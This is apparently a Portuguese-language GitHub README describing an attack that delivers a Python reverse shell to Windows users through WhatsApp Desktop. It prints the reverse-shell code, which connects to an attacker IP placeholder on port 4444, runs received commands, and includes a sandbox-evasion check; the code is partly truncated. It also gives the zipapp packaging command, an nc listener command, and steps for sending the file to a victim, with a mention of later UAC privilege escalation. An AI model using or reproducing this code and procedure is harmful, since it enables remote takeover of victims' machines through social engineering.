# Reverse_Shell_WhatsApp

## Introdução
Essa vulnerabilidade crítica presente em aplicativos de mensagens instantâneas como o **WhatsApp**, que permite que invasores executem script maliciosos desenvolvido em `Python` e `PHP` sem qualquer tipo de notificação, verificação do Windows Defender ou verificação realizada pelo usuário da máquina.
Com resultado disso, o invasor pode realizar um reverse shell e após isso; escalar privilégios em seu alvo, buscando privilégios administrativos através de falhas no UAC do Windows.
___
### Requisitos para o PC do alvo
- WhatsApp Desktop
- Python3 instalado na máquina
- Sistema Operacional: Windows10/11

### Fase 1: Criando o payload (Reverse Shell)
Criaremos um script em `.py` onde ficará nossa shell reverse
``` python
import os
import socket
import subprocess


if os.cpu_count() <= 2:
    quit()

HOST = 'SEU_IP'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(str.encode("[*] Connection Established!"))

while 1:
    try:
        s.send(str.encode(os.getcwd() + "> "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        if data == "quit": 
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            stdout_value = proc.stdout.read() + proc.stderr.read()
    
```
> Uma parte do código do script foi ofuscado para evitar mal uso, caso você seja um pesquisador ou entusiasta da área, me procure que irei disponibilizar.

### Fase 2: Criando o executável (.pyz)
Crie o executável `.pyz` utilizando o **zipaap**
 ```bash
python3 -m zipapp reverseshell.py -o reverseshell.pyz
```
https://github.com/user-attachments/assets/ba604063-a715-43c1-8fd2-e754ff4945f3" />

### Fase 3: Recebendo a conexão via Netcat
Inicie uma conexão utilizando **Netcat** utilizando a porta 4444 que foi usada no script
```bash
nc -lvnp 4444
```
<img width="259" height="75" alt="imagem" src="https://github.com/user-attachments/assets/60b155b0-e3dd-46b5-a5eb-057bfcb4ee1d" />

### Fase 4: Enviando o payload via WhatsApp
Envie o arquivo `.pyz`para a vítima através do WhatsApp, encaminhe como documento.
Assim que a vítima se conectar, teremos uma conexão em nosso Netcat.

## PoC - Prova de Conceito
https://github.com/user-attachments/assets/3f154f28-bb1e-42f3-a6b1-29f9d4c2f3af
